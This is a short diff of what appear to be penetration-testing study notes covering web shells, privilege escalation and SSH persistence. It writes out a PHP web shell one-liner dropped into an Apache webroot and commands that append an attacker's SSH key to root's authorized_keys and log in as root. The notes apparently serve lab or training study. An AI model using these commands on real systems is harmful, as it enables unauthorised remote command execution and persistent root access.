@@ -68,6 +68,13 @@ webroot for - Apache : /var/www/html - Nginx : /usr/local/nginx/html/ - IIS : c:
 For example if we attack a linux host we could do:
 => echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 
+
+
+
+
+
+
+
 II) Privilege Escalation
 
 Goal is to be root (linux) or administrator/SYSTEM (windows)
@@ -125,4 +132,8 @@ To create our ssh key : - ssh-keygen -f key (-f specify the output file)
 
 Once generated we copy it: - echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
 
-Then to connect we can do
+Then to connect we can do : ssh root@10.10.10.10 -i key
+
+
+Find something globally: find / -type d -name ".ssh" 2>/dev/null
+
